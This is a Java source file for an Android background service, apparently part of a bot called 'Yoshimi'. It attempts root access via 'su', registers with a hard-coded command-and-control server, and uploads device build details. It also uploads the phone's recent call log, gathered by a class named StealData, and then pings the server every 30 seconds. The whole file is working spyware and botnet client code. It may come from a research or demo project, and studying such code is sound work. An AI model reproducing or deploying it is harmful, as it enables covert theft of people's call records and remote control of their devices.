package com.redactedlabs.yoshimi;

import java.io.IOException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

import com.redactedlabs.yoshimi.RecentCall;
import com.redactedlabs.yoshimi.StealData;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.util.Log;

public class YoshimiService extends Service {
	
	private static final String TAG = "YoshimiService";
	private static final String CC_SERVER = "http://192.168.1.161:8888";
	private SQLite sqlite;
	private Process proc;
	private String uuid;
	
	@Override
	public void onCreate() {
		Log.d(TAG, "Yoshimi Service created");
		getRoot();
		sqlite = new SQLite(this);
		String query = "SELECT * FROM storage WHERE name = ?";
		Cursor cursor =  sqlite.getReadableDatabase().rawQuery(query, new String[] { "uuid" });
		if (cursor.getCount() == 1) {
			cursor.moveToFirst();
			uuid = cursor.getString(cursor.getColumnIndex("value"));
			Log.d(TAG, "Got uuid from db: " + uuid);
		} else {
			Integer count = cursor.getCount();
			Log.e(TAG, "UUID query returned " + count.toString() + "result(s)");
		}
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	
	public int onStartCommand(Intent intent, int flags, int startId) {
		try {
			mainLoop();
		} catch (InterruptedException error) {
			Log.d(TAG, error.toString());
		}
		Log.e(TAG, "Main loop ended?!?");
		return 0;
	}
	
	private void getRoot() {
		try {
			proc = Runtime.getRuntime().exec("su");
			try {
				proc.waitFor();
				if (proc.exitValue() != 255) {
					Log.d(TAG, "Successfully acquired root priviledges!");
				} else {
					Log.d(TAG, "Failed to acquire root priviledges.");
				}
			} catch (InterruptedException error) {
				Log.e(TAG, "Interrupted while attempting to get root: " + error.toString());
			}
		} catch (IOException error) {
			Log.e(TAG, "I/O Error while attempting to get root: " + error.toString());
		}
	}
	
	private void mainLoop() throws InterruptedException {
		Log.d(TAG, "Sending a hello ...");
		String getResponse = Http.GET(CC_SERVER+"/bot/hello", URLEncoder.encode(uuid));
		Log.d(TAG, "Yoshimi C&C (GET): " + getResponse);
		
		Log.d(TAG, "Sending version information ...");
		String postResponse = Http.POST(CC_SERVER+"/bot/version", URLEncoder.encode(uuid), getVersionInformation());
		Log.d(TAG, "Yoshimi C&C (POST): " + postResponse);
		
		Log.d(TAG, "Sending call information ...");
		postResponse = Http.POST(CC_SERVER+"/bot/calls", URLEncoder.encode(uuid), getCallInformation());
		Log.d(TAG, "Yoshimi C&C (POST): " + postResponse);
		
		Log.d(TAG, "Starting main loop ...");
		while (true) {
			Thread.sleep(30000);
			Log.d(TAG, "Still alive!");
			Http.GET(CC_SERVER+"/bot/ping", URLEncoder.encode(uuid));
		}
	}
	
	private List<NameValuePair> getVersionInformation() {
		Log.d(TAG, "Gathering version information ...");
		List<NameValuePair> details = new ArrayList<NameValuePair>();
		details.add(new BasicNameValuePair("os_version", System.getProperty("os.version")));
		details.add(new BasicNameValuePair("build_version", android.os.Build.VERSION.INCREMENTAL));
		details.add(new BasicNameValuePair("sdk_version", android.os.Build.VERSION.SDK));
		details.add(new BasicNameValuePair("release_version", android.os.Build.VERSION.RELEASE));
		details.add(new BasicNameValuePair("codename", android.os.Build.VERSION.CODENAME));
		details.add(new BasicNameValuePair("device", android.os.Build.DEVICE));
		details.add(new BasicNameValuePair("model", android.os.Build.MODEL));
		details.add(new BasicNameValuePair("product", android.os.Build.PRODUCT));
		return details;
	}
	
	private List<NameValuePair> getCallInformation() {
		Context currentContext = getBaseContext();
		RecentCall[] calls = StealData.getCalls(currentContext);
		JSONObject jsonContacts = new JSONObject();
		for(Integer index = 0; index < calls.length; index++) {
			try {
				jsonContacts.put(index.toString(), calls[index].getJsonObject());
			} catch (Exception error) {
				Log.d(TAG, "Failed to export call as json: " + error.toString());
			}
		}
		List<NameValuePair> callInfo = new ArrayList<NameValuePair>();
		callInfo.add(new BasicNameValuePair("jsonCalls", jsonContacts.toString()));
		return callInfo;
	}
}
